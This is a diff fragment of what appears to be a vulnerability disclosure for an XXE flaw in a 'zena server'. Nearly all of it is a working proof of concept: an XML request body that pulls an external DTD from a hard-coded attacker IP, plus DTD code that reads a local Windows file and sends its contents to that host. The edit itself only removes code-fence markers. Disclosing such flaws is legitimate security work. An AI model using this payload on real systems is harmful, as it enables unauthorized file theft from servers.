@@ -45,7 +45,7 @@ functions it was not intended to do. Ex. Reading a local file and exfiltrating i
 request back to the attacker
 Poc code - Request body to zena server:
 
-```<?xml version="1.0" ?>
+<?xml version="1.0" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
 <!ENTITY % sp SYSTEM "http://52.15.202.214:8080/xxe.dtd">
@@ -66,7 +66,7 @@ ALLAGENTS="YES"><DESCRIPTION></DESCRIPTION><ROLES/></USER>]]></USER></USERS></PA
 External DTD code hosted on attacker server as xxe.dtd:
 
 <!ENTITY % data SYSTEM "file:///c:/sensative.txt">
-<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">```
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://52.15.202.214:8080/?%data;'>">
 
 
 ![image](https://user-images.githubusercontent.com/81385287/171972899-f595ccbc-f45b-4368-8944-f470960ebad9.png)
